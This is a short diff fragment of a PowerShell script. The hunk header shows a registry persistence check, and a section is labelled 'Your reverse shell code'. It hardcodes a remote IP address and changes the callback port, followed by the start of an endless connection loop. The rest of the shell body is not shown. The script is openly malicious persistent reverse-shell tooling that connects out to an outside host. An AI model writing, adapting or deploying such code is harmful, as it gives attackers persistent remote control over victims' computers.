@@ -20,7 +20,7 @@ if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyCo
 
 # --- Your reverse shell code ---
 $remoteIp = "129.151.142.36"
-$remotePort = 4655
+$remotePort = 3324
 
 while ($true) {
     try {
